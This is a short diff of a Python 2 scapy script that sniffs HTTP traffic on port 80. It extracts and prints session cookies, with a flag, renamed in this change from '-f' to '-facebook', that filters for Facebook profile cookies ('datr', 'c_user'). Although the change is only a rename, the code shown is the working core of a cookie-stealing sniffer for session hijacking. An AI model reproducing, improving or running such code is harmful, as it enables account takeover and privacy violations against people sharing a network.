@@ -42,7 +42,7 @@ def sniffCookies(p):
 	 global cookies_seen
 	 if 'Cookie:' in getattr(p,'load',''):
 		cookie = extractCookie(p.load)
-		if not "-f" in sys.argv and cookie not in cookies_seen:
+		if not "-facebook" in sys.argv and cookie not in cookies_seen:
 			print "[+] New cookie seen: "
 			printCookie(cookie)
 		elif cookie.has_key("datr") and cookie.has_key("c_user") and cookie["c_user"] not in cookies_seen: # We have ourselves a facebook Cookie from a unseen profile 
@@ -52,7 +52,7 @@ def sniffCookies(p):
 		cookies_seen = cookies_seen + (cookie,)
 
 def printUsage():
-	print "Usage: %s <-f> IFACE" % sys.argv[0]
+	print "Usage: %s IFACE <-facebook>" % sys.argv[0]
 	
 if __name__ == "__main__":
 	if len(sys.argv) < 2:
@@ -64,5 +64,5 @@ if __name__ == "__main__":
 		sys.exit(0)
 									 		
 	interface = sys.argv[1]
-	if "-f" in sys.argv: print "[+] Printing facebook profile cookies only"
+	if "-facebook" in sys.argv: print "[+] Printing facebook profile cookies only"
 	sniff(iface=interface,filter="tcp port 80",prn=sniffCookies)
